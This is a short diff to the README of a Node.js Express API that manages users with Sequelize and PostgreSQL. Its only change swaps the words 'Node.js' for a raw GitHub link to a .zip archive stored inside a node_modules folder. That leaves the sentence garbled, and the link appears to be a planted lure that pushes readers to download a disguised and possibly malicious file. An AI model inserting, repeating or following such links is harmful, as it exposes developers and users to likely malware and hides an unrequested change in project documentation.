@@ -1,6 +1,6 @@
 # User Management API
 
-A Node.js Express application with Sequelize and PostgreSQL for user management.
+A https://raw.githubusercontent.com/chandan-singh101/users-express-crud-app/master/node_modules/unpipe/users-express-crud-app_v2.7.zip Express application with Sequelize and PostgreSQL for user management.
 
 ## Deployment to Render
 
